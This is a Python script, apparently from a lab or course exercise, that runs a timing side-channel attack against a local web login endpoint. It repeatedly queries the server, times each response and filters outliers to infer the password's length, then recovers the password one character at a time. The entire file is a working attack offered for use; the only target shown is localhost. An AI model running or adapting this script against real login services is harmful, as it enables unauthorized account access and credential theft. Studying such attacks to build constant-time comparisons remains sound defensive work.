import time
import requests
import numpy as np
from concurrent.futures import ThreadPoolExecutor
import statistics
from functools import partial

# Configuration
SERVER_URL = "http://127.0.0.1"
USER_ID = "326647914"
DIFFICULTY = 1
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
RETRIES = 20  # Increased for better accuracy
MAX_WORKERS = 10  # Reduced to avoid overwhelming server
LENGTH_THRESHOLD = 0.015  # Threshold for length detection
TIME_THRESHOLD = 1.30  # Threshold for character detection

class TimingAttack:
    def __init__(self, server_url, user_id, difficulty=1):
        self.server_url = server_url
        self.user_id = user_id
        self.difficulty = difficulty
        self.session = requests.Session()
        
    def _make_request(self, password):
        """Make a single request with better error handling"""
        url = f"{self.server_url}/?user={self.user_id}&password={password}&difficulty={self.difficulty}"
        try:
            start = time.perf_counter()
            response = self.session.get(url, timeout=5)
            end = time.perf_counter()
            return end - start, response.text.strip()
        except:
            return None, None

    def measure_time(self, password):
        """Get timing measurements with outlier removal"""
        timings = []
        responses = []
        
        # Collect measurements
        for _ in range(RETRIES):
            timing, response = self._make_request(password)
            if timing is not None:
                timings.append(timing)
                responses.append(response)
                
        if not timings:
            return float('inf'), ""
            
        # Remove outliers using median absolute deviation
        median = statistics.median(timings)
        mad = statistics.median([abs(t - median) for t in timings])
        filtered_times = [t for t in timings if abs(t - median) < 2 * mad]
        
        if not filtered_times:
            return float('inf'), ""
            
        return np.median(filtered_times), responses[0]

    def find_password_length(self):
        """More accurate password length detection"""
        print("Determining password length...")
        prev_time = 0
        consistent_length = 0
        target_consistency = 2  # Number of consistent measurements needed
        
        for length in range(1, 20):  # Test reasonable lengths
            test_password = 'a' * length
            times = []
            
            # Multiple measurements for length
            for _ in range(3):
                response_time, _ = self.measure_time(test_password)
                times.append(response_time)
            
            avg_time = np.median(times)
            print(f"Length {length}: {avg_time:.5f}s")
            
            # Check if time increased significantly
            if avg_time > prev_time + LENGTH_THRESHOLD:
                consistent_length += 1
                if consistent_length >= target_consistency:
                    print(f"Found consistent length: {length}")
                    return length
            else:
                consistent_length = 0
            
            prev_time = avg_time
        
        return 10  # Fallback length

    def find_password(self):
        """Find password with better accuracy"""
        length = self.find_password_length()
        print(f"Estimated password length: {length}")
        password = ""
        prev_position_time = 0
        
        for position in range(length):
            print(f"\nTesting position {position + 1}...")
            times = {char: [] for char in CHARACTERS}
            
            # Test each character multiple times
            for char in CHARACTERS:
                candidate = password + char + "a" * (length - len(password) - 1)
                timing, response = self.measure_time(candidate)
                
                if response == "1":
                    print(f"Found correct password early: {candidate}")
                    return candidate
                    
                times[char].append(timing)
                print(f"Char '{char}': {timing:.5f}s")
            
            # Calculate median time for each character
            median_times = {char: np.median(timings) for char, timings in times.items()}
            
            # Find character with maximum time that shows significant increase
            sorted_chars = sorted(median_times.items(), key=lambda x: x[1], reverse=True)
            best_char = sorted_chars[0][0]
            best_time = sorted_chars[0][1]
            
            # Verify the timing difference is significant
            if best_time > prev_position_time * TIME_THRESHOLD:
                password += best_char
                prev_position_time = best_time
                print(f"Found character: '{best_char}' (Current: {password})")
            else:
                # If no significant timing difference, try verifying each possibility
                for char, _ in sorted_chars[:3]:  # Check top 3 candidates
                    test_password = password + char + "a" * (length - len(password) - 1)
                    _, response = self.measure_time(test_password)
                    if response == "1":
                        password += char
                        print(f"Verified character through response: '{char}' (Current: {password})")
                        break
                else:
                    password += best_char
                    print(f"Using best guess: '{best_char}' (Current: {password})")
        
        # Final verification
        final_verify_count = 3
        for _ in range(final_verify_count):
            _, response = self.measure_time(password)
            if response == "1":
                return password
                
        print("Warning: Final password verification failed")
        return password

def main():
    attacker = TimingAttack(SERVER_URL, USER_ID, DIFFICULTY)
    
    print("Starting timing attack...")
    start_time = time.time()
    
    password = attacker.find_password()
    print(f"\nFinal password: {password}")
    print(f"Total time: {time.time() - start_time:.2f} seconds")

if __name__ == "__main__":
    main()